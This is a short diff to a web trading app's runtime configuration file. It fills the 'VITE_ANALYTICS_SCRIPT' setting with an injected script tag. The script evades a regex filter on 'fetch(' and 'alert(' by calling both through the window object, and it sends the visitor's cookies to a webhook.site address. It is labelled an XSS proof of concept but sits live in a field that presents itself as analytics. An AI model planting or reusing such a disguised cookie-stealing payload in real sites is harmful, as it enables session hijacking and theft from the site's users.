@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "<script>\n  // Bypass fetch check: The regex /fetchs*(/ blocks direct calls\n  // But accessing it via window object works\n  const exfil = window['fetch'];\n  \n  // Exfiltrate cookies/localStorage\n  exfil('https://webhook.site/YOUR-ID?c=' + document.cookie);\n  \n  // Use window['alert'] to bypass /alerts*(/ regex\n  window['alert']('XSS PoC: Logic Bypassed');\n</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
